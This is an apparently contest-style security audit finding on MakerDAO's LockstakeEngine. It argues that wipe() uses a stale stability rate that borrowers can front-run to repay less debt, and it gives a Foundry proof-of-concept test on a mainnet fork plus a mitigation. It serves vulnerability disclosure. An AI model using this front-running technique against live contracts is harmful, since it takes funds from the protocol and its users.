Unique Pistachio Chipmunk

High

# ```LockstakeEngine.wipe()``` does not use the most current stability rate, as a result, the user will repay less than he is supposed to and the protocol will lose funds.

### Summary

```LockstakeEngine.wipe()``` does not use the most current stability rate, as a result, the user might repay less than he is supposed to and the protocol will lose funds. 

Even ```jug.drip(ilk)``` is called periodically to bring stablilty rate up to date, a user can still front-run these update transactions and use the old rate to repay less debt (or pay the same amount but cancel more debt from ```art```).

The same problem for ``wipeAll``. Our analysis will focus on ```wipe()``` below. 

This attack can be replayed indefinitely, therefore, I mark this finding as ```high```.

### Root Cause

```LockstakeEngine.wipe()``` does not call ```jug.drip(ilk)``` first to calculate the most up-to-date stablity fee. Instead, it uses the old rate to calculate ```dart``` and the amount to deduct from the remaining debt ```art```. Therefore, the used rate is smaller than what it is supposed to be, leading to deduct more debt from ```art``` then it is supposed to. This essentially allows the borrower to replay less than he is supposed to. A loss of funds for the protocol. This occurs to every borrower, so I marked this as high. 

[https://github.com/sherlock-audit/2024-06-makerdao-endgame/blob/dba30d7a676c20dfed3bda8c52fd6702e2e85bb1/lockstake/src/LockstakeEngine.sol#L391-L399](https://github.com/sherlock-audit/2024-06-makerdao-endgame/blob/dba30d7a676c20dfed3bda8c52fd6702e2e85bb1/lockstake/src/LockstakeEngine.sol#L391-L399)

### Internal pre-conditions

Nobody calls ```jug.drip(ilk)``` right before the call of ```wipe()```. Or the borrower front-runs a  ```jug.drip(ilk)``` transaction to take advantage of the old rate to pay less for his debt. 

### External pre-conditions

Time elapsed since last call of  ```jug.drip(ilk)```, so there is a new rate that needs to be calcualted. 

### Attack Path

In the following, we show Bob opens a urn with 2000 ether of collateral and borrows 20 ether of nst:  

Balances for  urn
  mkr bal:  0
  nst bal:  0
  vat.dai:  0
  vat.sin:  0
  vat.gem(ilk, a):  0
  ink:  2000000000000000000000
  art:  10000000000000000000

Bob's balances:
  mkr bal:  98000000000000000000000
  nst bal:  20000000000000000000
  vat.dai:  0
  vat.sin:  0
  vat.gem(ilk, a):  0
  ink:  0
  art:  0

After 100 days (this is an exaggeration but it shows the negative effect of not using a current rate), the new stability rate is: 
2180484675123196105405976966. The ```wipe()``` function uses the old rate of 2000000000000000000000000000. Suppose Bob repays 10 ether of nst, then it will cancel half of the debt, with a remaining debt of ```art =  5000000000000000000```. 

On the other hand, if the ```wipe()``` function uses the new rate of 2180484675123196105405976966. Then Bob repays 10 ether of nst, due to the increase of rate, less than half of the debt will be cancelled, with a remaining debt of ```art = 5413863663391715485```.

In summary, due to the use of an old rate of 2000000000000000000000000000 instead of the new rate of 2180484675123196105405976966. Bob was able to repay more debt than he is supposed to with 10 ether of nst. This leads to the loss of funds for the protcol. This occurs frequently for each borrower, thus I mark this finding as *high*.




### Impact

```LockstakeEngine.wipe()``` does not use the most current stability rate, as a result, the user will repay less than he is supposed to and the protocol will lose funds. 

### PoC

comment/uncomment the line ```dss.jug.drip(ilk);``` to simulate the use of old rate or new rate. This also simulates the front-running situation.

One can see that with old/new rate, the remaining debt for Bob is not the same. Bob will be able to repay more debt with the same 10 ether of nst when he uses the old rate (maybe via front-running ```dss.jug.drip(ilk);```). 

run ```forge test --match-test testWipe1 -vv```.

```javascript
// SPDX-License-Identifier: AGPL-3.0-or-later

pragma solidity ^0.8.21;

import "dss-test/DssTest.sol";

import "dss-interfaces/Interfaces.sol";
import { LockstakeClipper } from "src/LockstakeClipper.sol";
import { LockstakeEngineMock } from "test/mocks/LockstakeEngineMock.sol";
import { PipMock } from "test/mocks/PipMock.sol";

import { LockstakeEngine } from "src/LockstakeEngine.sol";
import { VoteDelegateFactoryMock, VoteDelegateMock } from "test/mocks/VoteDelegateMock.sol";
import { NstJoinMock } from "test/mocks/NstJoinMock.sol";
import { NstMock } from "test/mocks/NstMock.sol";
import { MkrNgtMock } from "test/mocks/MkrNgtMock.sol";
import { LockstakeMkr } from "src/LockstakeMkr.sol";
import { GemMock } from "test/mocks/GemMock.sol";


interface VatLike {
    function dai(address) external view returns (uint256);
    function sin(address) external view returns (uint256);
    function gem(bytes32, address) external view returns (uint256);
    function ilks(bytes32) external view returns (uint256, uint256, uint256, uint256, uint256);
    function urns(bytes32, address) external view returns (uint256, uint256);
    function rely(address) external;
    function file(bytes32, bytes32, uint256) external;
    function init(bytes32) external;
    function hope(address) external;
    function frob(bytes32, address, address, address, int256, int256) external;
    function slip(bytes32, address, int256) external;
    function suck(address, address, uint256) external;
    function fold(bytes32, address, int256) external;   
}

interface GemLike {
    function balanceOf(address) external view returns (uint256);
}

interface VowLike {
    function flap() external returns (uint256);
    function Sin() external view returns (uint256);
    function Ash() external view returns (uint256);
    function heal(uint256) external;
    function bump() external view returns (uint256);
    function hump() external view returns (uint256);
}

interface DogLike {
    function Dirt() external view returns (uint256);
    function chop(bytes32) external view returns (uint256);
    function ilks(bytes32) external view returns (address, uint256, uint256, uint256);
    function rely(address) external;
    function file(bytes32, uint256) external;
    function file(bytes32, bytes32, address) external;
    function file(bytes32, bytes32, uint256) external;
    function bark(bytes32, address, address) external returns (uint256);
}

interface SpotterLike {
    function file(bytes32, bytes32, address) external;
    function file(bytes32, bytes32, uint256) external;
    function poke(bytes32) external;
}

interface CalcFabLike {
    function newLinearDecrease(address) external returns (address);
    function newStairstepExponentialDecrease(address) external returns (address);
}

interface CalcLike {
    function file(bytes32, uint256) external;
} 


contract LockstakeClipperTest is DssTest {
    using stdStorage for StdStorage;

    DssInstance dss;
    address     pauseProxy;
    PipMock     pip;
    GemLike     dai;
    VowLike vow;
    VatLike vat;

    DSTokenAbstract         mkr;
    VoteDelegateFactoryMock voteDelegateFactory;
    NstMock nst;
    MkrNgtMock              mkrNgt;
    LockstakeMkr      lsMkr;
    NstJoinMock nstJoin;
    GemMock                 ngt;

    LockstakeEngine engine;
    LockstakeClipper clip;
    LockstakeMkr lsmkr;
    

    // Exchange exchange;

    address constant LOG = 0xdA0Ab1e0017DEbCd72Be8599041a2aa3bA7e740F;

    address ali;

    bytes32 constant ilk = "LSE";


    uint256 constant startTime = 604411200; // Used to avoid issues with `block.timestamp`

    function _ink(bytes32 ilk_, address urn_) internal view returns (uint256) {
        (uint256 ink_,) = dss.vat.urns(ilk_, urn_);
        return ink_;
    }
    function _art(bytes32 ilk_, address urn_) internal view returns (uint256) {
        (,uint256 art_) = dss.vat.urns(ilk_, urn_);
        return art_;
    }

    function ray(uint256 wad) internal pure returns (uint256) {
        return wad * 10 ** 9;
    }

    function rad(uint256 wad) internal pure returns (uint256) {
        return wad * 10 ** 27;
    }

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));
        vm.warp(startTime);

        dss = MCD.loadFromChainlog(LOG);

        pauseProxy = dss.chainlog.getAddress("MCD_PAUSE_PROXY");
        dai = GemLike(dss.chainlog.getAddress("MCD_DAI"));
        vow = VowLike(dss.chainlog.getAddress("MCD_VOW"));
        vat = VatLike(dss.chainlog.getAddress("MCD_VAT"));
       

        mkr = DSTokenAbstract(dss.chainlog.getAddress("MCD_GOV"));
        voteDelegateFactory = new VoteDelegateFactoryMock(address(mkr));
        nst = new NstMock();
        nstJoin = new NstJoinMock(address(vat), address(nst));
        ngt = new GemMock(0);
        mkrNgt = new MkrNgtMock(address(mkr), address(ngt), 24_000);
        lsmkr   = new LockstakeMkr();
       
  

        



        vm.startPrank(pauseProxy);
        dss.vat.init(ilk);                  // init the collateral info identified by ```ilk```
        dss.vat.fold(ilk, address(dss.vow), 1*10**27);       // set initial rate for ilk

/*
 function poke(bytes32 ilk) external {
        (bytes32 val, bool has) = ilks[ilk].pip.peek();
        uint256 spot = has ? rdiv(rdiv(mul(uint(val), 10 ** 9), par), ilks[ilk].mat) : 0;  par = 1 RAY, 
        vat.file(ilk, "spot", spot);
        emit Poke(ilk, val, spot);
    }
*/
        // set spot price for ilk via set price for pip price

        console2.log("set  spot price $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$");
        pip = new PipMock();                      
        pip.setPrice(4 ether); 
        dss.spotter.file(ilk, "pip", address(pip)); // oracle
        dss.spotter.file(ilk, "mat", ray(2 ether)); // 200% liquidation ratio for easier test calcs
        dss.spotter.poke(ilk);
        (,, uint256 spot1,,) = dss.vat.ilks(ilk);         // so spot price = poke price / 2
        console2.log("spot price: ", spot1); // 4 ether * 10 ** 9  

        
        dss.vat.file(ilk, "dust", rad(10 ether)); 
        dss.vat.file(ilk, "line", rad(1000000 ether));
        dss.vat.file("Line",      dss.vat.Line() + rad(1000000 ether));

        
        dss.dog.file(ilk, "chop", 1 ether); // no chop let's say
        dss.dog.file(ilk, "hole", rad(1000 ether));
        dss.dog.file("Hole",      dss.dog.Dirt() + rad(1000 ether));

       //  engine = new LockstakeEngineMock(address(dss.vat), ilk);           // let's use a real one ?????
   
        engine =  new LockstakeEngine(address(voteDelegateFactory), address(nstJoin), ilk, address(mkrNgt), address(lsmkr),  15 * WAD / 100);
        engine.file("jug", address(dss.jug));
        dss.jug.init(ilk);
        dss.jug.file(ilk, "duty", 100000001 * 10**27 / 100000000); // decides rate

        dss.vat.rely(address(engine));
        vm.stopPrank();

        lsmkr.rely(address(engine));


        address calc = CalcFabLike(dss.chainlog.getAddress("CALC_FAB")).newStairstepExponentialDecrease(address(this));
        CalcLike(calc).file("cut",  RAY - ray(0.01 ether));  // 1% decrease
        CalcLike(calc).file("step", 1);                      // Decrease every 1 second

        // dust and chop filed previously so clip.chost will be set correctly
        clip = new LockstakeClipper(address(dss.vat), address(dss.spotter), address(dss.dog), address(engine));
        clip.file("vow", address(vow));
        clip.file("buf",  ray(1.25 ether));   // 25% Initial price buffer
        clip.file("calc", address(calc));     // File price contract
        clip.file("cusp", ray(0.3 ether));    // 70% drop before reset
        clip.file("tail", 3600);        
        clip.file("tip",  rad(100 ether)); // Flat fee of 100 DAI
        clip.file("chip", 0.02 ether);     // Linear increase of 2% of tab
        clip.upchost(); // what does it do?      // dust: 20 ether * 10**27, chop: 1.1 ether = chost = 22 ether * 10**27
        console.log("chost: ", clip.chost());

        clip.rely(address(dss.dog));

        vm.startPrank(pauseProxy);
        engine.rely(address(clip));
        vm.stopPrank();

        vm.startPrank(pauseProxy);
        dss.dog.file(ilk, "clip", address(clip)); // 
        dss.dog.rely(address(clip));
        dss.vat.rely(address(clip));
        vm.stopPrank();

        ali = address(111);
     
        dss.vat.hope(address(clip)); // can[address(this)， clip] = 1
        vm.prank(ali); dss.vat.hope(address(clip)); // can[ali, clip] = 1
     
        vm.startPrank(pauseProxy);
        dss.vat.suck(address(0), address(ali),  rad(1000 ether));
        vm.stopPrank();
    }

    function printAuction(uint id) public
    {
        LockstakeClipper.Sale memory sale;

        (sale.pos, sale.tab, sale.lot, sale.tot, sale.usr, sale.tic, sale.top) = clip.sales(id);
        console2.log("\n***************************************************************");
        console2.log("sale.pos: ", sale.pos);
        console2.log("sale.tab: ", sale.tab);
        console2.log("sale.lot: ", sale.lot);
        console2.log("sale.tot: ", sale.tot);
        console2.log("sale.usr:", sale.usr);
        console2.log("sale.tic: ", sale.tic);
        console2.log("sale.top: ", sale.top);
        console2.log("***************************************************************\n");
    }

    
    function printBalance(address a, string memory name) public{
        console2.log("**************************************************");
        console2.log("Vat info for ", name);
        console2.log("mkr bal: ", mkr.balanceOf(a));
        console2.log("nst bal: ", nst.balanceOf(a));
        console2.log("vat.dai: ", dss.vat.dai(a));
        console2.log("vat.sin: ", dss.vat.sin(a));
        console2.log("vat.gem(ilk, a): ", dss.vat.gem(ilk, a));
        (uint256 ink, uint256 art) = dss.vat.urns(ilk, a);
        console2.log("ink: ", ink);
        console2.log("art: ", art);
        console2.log("**************************************************");
    }


    function testWipe1() public  {
        console2.log("jug", address(dss.jug));

        address Bob = address(123);
        address kpr = address(456);


        deal(address(mkr), Bob, 100_000 * 10**18);             // 100_000 ether
        deal(address(ngt), Bob, 100_000 * 24_000 * 10**18);
        
        //printBalance(Bob, "Bob");
        //printBalance(address(engine), "engine");
        
        vm.startPrank(Bob);                // 1. open a urn
        address urn = engine.open(0);
        mkr.approve(address(engine), 100_000 * 10**18);
        engine.lock(urn, 2000 * 10**18, 0);
    
        engine.draw(urn, address(Bob), 20 ether);     
        vm.stopPrank();
        printBalance(Bob, "Bob");
        printBalance(address(urn), "urn");
        printBalance(address(engine), "engine"); 
    

        (, uint256 oldRate,,,) = vat.ilks(ilk);
        console2.log("oldRate: ", oldRate);
        vm.warp(block.timestamp + 100 days);
        dss.jug.drip(ilk);                             // comment/uncomment to simulate race condition
        (, uint256 newRate,,,) = vat.ilks(ilk);
        console2.log("newRate: ", newRate);


        console2.log("\n \n repay the debt with 10 ether of nat...");
        vm.startPrank(Bob);
        nst.approve(address(engine), 10 ether);  // after pay 10 ether, we still half more than half debt due to rate incrase
        engine.wipe(urn, 10 ether);              // it might use a stale rate to calcualte the debt to be deducted from art
        vm.stopPrank();

        printBalance(Bob, "Bob");
        printBalance(address(urn), "urn");
        printBalance(address(engine), "engine"); // where is mkr and lsmkr? 
    }




    function testTake1() public  {
        console2.log("jug", address(dss.jug));

        address Bob = address(123);
        address kpr = address(456);


        deal(address(mkr), Bob, 100_000 * 10**18);             // 100_000 ether
        deal(address(nst), Bob, 123_000 * 10**18); 
        deal(address(ngt), Bob, 100_000 * 24_000 * 10**18);
        
        //printBalance(Bob, "Bob");
        //printBalance(address(engine), "engine");
        
        vm.startPrank(Bob);                // 1. open a urn
        address urn = engine.open(0);
        mkr.approve(address(engine), 100_000 * 10**18);
        engine.lock(urn, 2000 * 10**18, 0);
        //printBalance(address(urn), "urn");
        //printBalance(address(engine), "engine"); // where is mkr and lsmkr? 
    
        engine.draw(urn, address(Bob), 20 ether);     
        vm.stopPrank();

        console2.log("\n after draw.....................");
        //printBalance(Bob, "Bob");
        //printBalance(address(urn), "urn");
        //printBalance(address(engine), "engine"); // where is mkr and lsmkr? 
           
        
        // lower the price of collaterl:
        vm.startPrank(pauseProxy);
        vat.file(ilk, "spot", 123);
        vm.stopPrank();      // now we can liquidate urn

        console2.log("\n starto bark$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$");

        assertEq(clip.kicks(), 0);
        dss.dog.bark(ilk, urn, kpr);     
        assertEq(clip.kicks(), 1);
        console2.log("\n after barking..............");
        printAuction(1);
        //printBalance(Bob, "Bob");
        //printBalance(address(urn), "urn");
        //printBalance(address(clip), "clip"); // where is mkr and lsmkr? 
        //printBalance(address(engine), "engine"); // where is mkr and lsmkr? 
           
        
        // Bid so owe (= 25 * 5 = 125 RAD) > tab (= 110 RAD)
        // Readjusts slice to be tab/top = 25
        vm.startPrank(pauseProxy);
        dss.vat.file(ilk, "dust", rad(20 ether));  // so the actual chost should be douled
        vm.stopPrank();
        
        vm.prank(ali); 
        clip.take({
            id:  1,
            amt: 2 ether,
            max:  5000000000000000000000000000,
            who: address(ali),                      // sli is the keeper
            data: ""
        });

        console2.log("After clip.take....");
      

        printAuction(1);
        //printBalance(Bob, "Bob");
        //printBalance(address(urn), "urn");
        //printBalance(address(clip), "clip"); // where is mkr and lsmkr? 
        //printBalance(address(engine), "engine"); // where is mkr and lsmkr? 

        vm.warp(block.timestamp + 3600);
        (bool needsRedo, uint256 price, uint256 lot, uint256 tab) = clip.getStatus(1);
        console2.log("needsRedo: ", needsRedo); 

        console2.log("current: ", clip.chost()); 

        // clip.upchost();   // comment/uncomment this line to simulate the race condition 
        console2.log("The actual chost: ", clip.chost());

        address frank = address(888);
        clip.redo(1, frank);
        printBalance(frank, "frank");       
    }

}

```

### Mitigation

Call ```jug.drip(ilk)``` at the beginning of the wipe() and wipeAll() function so that they will always use the new rate. 